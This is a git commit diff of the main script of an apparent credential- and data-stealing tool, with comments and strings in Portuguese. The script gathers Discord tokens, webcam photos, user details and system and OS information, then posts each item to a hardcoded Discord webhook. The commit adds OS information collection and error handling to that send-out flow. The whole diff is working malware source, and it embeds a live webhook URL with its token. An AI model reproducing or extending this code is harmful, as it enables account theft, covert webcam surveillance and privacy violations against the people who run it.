34f651a77296be1385d401c216a954bc4be8d51e
Faccin27 <gfaccin27@gmail.com>
2024-09-14 00:34:07 -0300

    feat: send operating system information to Discord

--- main.py
+++ main.py
@@ -3,7 +3,8 @@ import requests
 from plugins.systeminfo import obter_informacoes_sistema
 from plugins.discordtoken import TokenExtractor
 from plugins.webcam import capture_photo
-from plugins.userinfo import UserInfos 
+from plugins.userinfo import UserInfos
+from plugins.operationsystem import get_os_info
 
 DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1284222512514727937/A08myURhvEgEJ2_76NX_gQa3vVr2ZG1VBiShR9_xRepZlpu-JxSQUe84vgWUzSxf9A3i'
 webhook_avatar = "https://cdn.discordapp.com/attachments/1284297215770234900/1284297297223487552/image.png?ex=66e61e90&is=66e4cd10&hm=e8a738f0ab2a7ec1859cf40150a5e768604cc3d19479c8f0000e19334915953a&"
@@ -17,17 +18,18 @@ def executar_comando(comando):
         return f"Erro ao executar o comando: {e}"
 
 def enviar_imagem_para_discord(caminho_foto):
-    with open(caminho_foto, 'rb') as imagem:
-        files = {
-            'file': imagem
-        }
-        payload = {
-            'username': webhook_username,
-            'avatar_url': webhook_avatar,
-        }
-        response = requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
-        if response.status_code != 200:
-            print(f"Erro ao enviar para o Discord: {response.status_code} - {response.text}")
+    try:
+        with open(caminho_foto, 'rb') as imagem:
+            files = {'file': imagem}
+            payload = {
+                'username': webhook_username,
+                'avatar_url': webhook_avatar,
+            }
+            response = requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
+            if response.status_code != 200:
+                print(f"Erro ao enviar para o Discord: {response.status_code} - {response.text}")
+    except Exception as e:
+        print(f"Erro ao ler ou enviar a imagem: {e}")
 
 def enviar_para_discord(mensagem, embed=None):
     payload = {
@@ -43,39 +45,52 @@ def enviar_para_discord(mensagem, embed=None):
     response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
     if response.status_code != 204:
         print(f"Erro ao enviar para o Discord: {response.status_code} - {response.text}")
-
 if __name__ == "__main__":
-    informacoes_sistema = obter_informacoes_sistema()
-    discord_info = TokenExtractor().get_tokens()
-    webcam_foto = capture_photo()
+    try:
+        informacoes_sistema = obter_informacoes_sistema()
+        discord_info = TokenExtractor().get_tokens()
+        webcam_foto = capture_photo()
+        user_info_instance = UserInfos()
+        user_info = user_info_instance.get_user_info()
+        os_info = get_os_info()  
+        
 
-    user_info_instance = UserInfos()
-    user_info = user_info_instance.get_user_info()
+        user_info_message = '\n'.join(f"{key}: {value}" for key, value in user_info.items())
+        
+        user_info_embed = {
+            'title': 'Informações do Usuário',
+            'description': f'```\n{user_info_message}\n```',
+            'color': 0x0000FF  
+        }
+        enviar_para_discord('', embed=user_info_embed)
 
-    user_info_message = '\n'.join(f"{key}: {value}" for key, value in user_info.items())
+        sistema_embed = {
+            'title': 'Informações do Sistema',
+            'description': f'```\n{informacoes_sistema}\n```',
+            'color': 0x00FF00  
+        }
+        enviar_para_discord('', embed=sistema_embed)
+        
+        os_embed = {
+            'title': 'Informações de SO',
+            'description': f'```\n{os_info}\n```',
+            'color': 0x00FF00
+        }
+        enviar_para_discord('', embed=os_embed)
+
+        formatted_discord_info = '\n'.join(discord_info) if discord_info else 'Nenhum token encontrado'
+
+        discord_embed = {
+            'title': 'Informações do Discord',
+            'description': f'```\n{formatted_discord_info}\n```',
+            'color': 0xFF0000  
+        }
+        enviar_para_discord('', embed=discord_embed)
+
+
+        
+        if webcam_foto:
+            enviar_imagem_para_discord(webcam_foto)
     
-    user_info_embed = {
-        'title': 'Informações do Usuário',
-        'description': f'```\n{user_info_message}\n```',
-        'color': 0x0000FF  # Azul, por exemplo. Escolha a cor que preferir
-    }
-    enviar_para_discord('', embed=user_info_embed)
-
-    sistema_embed = {
-        'title': 'Informações do Sistema',
-        'description': f'```\n{informacoes_sistema}\n```',
-        'color': 0x00FF00  # Verde
-    }
-    enviar_para_discord('', embed=sistema_embed)
-
-    formatted_discord_info = '\n'.join(discord_info) if discord_info else 'Nenhum token encontrado'
-
-    discord_embed = {
-        'title': 'Informações do Discord',
-        'description': f'```\n{formatted_discord_info}\n```',
-        'color': 0xFF0000  # Vermelho
-    }
-    enviar_para_discord('', embed=discord_embed)
-
-    if webcam_foto:
-        enviar_imagem_para_discord(webcam_foto)
+    except Exception as e:
+        print(f"Erro geral: {e}")
